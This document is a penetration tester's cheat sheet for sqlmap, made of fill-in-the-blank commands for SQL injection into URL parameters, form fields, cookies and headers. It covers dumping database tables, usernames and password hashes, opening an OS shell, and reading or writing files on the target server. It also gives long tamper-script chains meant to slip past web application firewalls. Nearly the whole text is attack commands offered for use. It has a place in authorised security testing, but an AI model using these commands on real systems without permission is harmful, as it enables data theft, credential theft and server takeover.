# SQLMAP

% sql injection
#plateform/linux #target/remote #cat/ATTACK/INJECTION  #port/80 #port/443 #port/8080 #port/8443

## usage
```
https://github.com/sqlmapproject/sqlmap/wiki/Usage
```

## cheatsheets
```
https://cybr.com/ethical-hacking-archives/sqlmap-cheat-sheets-to-help-you-find-sql-injections/
```

## flush session files
```
--flush-session     # Flush session files for current target
--fresh-queries     # Ignore query results stored in session file
```

## HTTP protocol authentication
types: 
    Basic
    Digest
    NTLM
```
--auth-type <auth_type|Basic> --auth-cred "<login>:<password>"
--headers="Authorization: Basic <value>"
```

## HTTP protocol private key authentication
cat auth_file.key auth_file.pem > auth_file.txt
```
--auth-file <file>
```

## proxy
```
--proxy="socks5://127.0.0.1:2080"
```

## request file
```
-r <request_file> -p <comma_sep_params>
```

## GET Request Injection
```
-u "<url>?<param>=*" -p <param>
-u <url>
```

## POST Request Injection
```
-u "<url>" --data "username=*&password=*"
```

## POST Request Injection (Parse and test forms on target URL)
```
-u "<url>" --forms
```

## injections in Headers and other HTTP Method
```
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"
```

## technique
```
--technique=BEQSTU
```

## Page comparison
```
--string="<string_showed_when_TRUE>"
--not-string="<string_showed_when_FALSE>"
```

## request
```
-sql-query "<query>"
```

## Enumeration
```
--dbs
-D <database_name> --tables
-D <database_name> -T <table> --dump
-D <database_name> -T <table> --columns
-D <database_name> -T <table> -C <column> --dump
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
```


## get shell
```
--os-shell
```

## file read
```
--file-read=<remote_file>
```

## file write
```
sqlmap -u <url> --file-write=<local_file> --file-dest=<remote_path_destination>
```



## get with cookie
```
sqlmap -u <url> --cookie=<cookie>
```

## sqlmap - classic with tamper
```
sqlmap -u '<url>' tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

## sqlmap - hardcore
```
sqlmap -u '<url>' --level=5 --risk=3 -p '<parameter>' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
```

## sqlmap - mysql tamper list
```
sqlmap -u <url> --dbms=MYSQL tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

## sqlmap - mssql tamper list
```
sqlmap -u <url> --dbms=MSSQL tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```
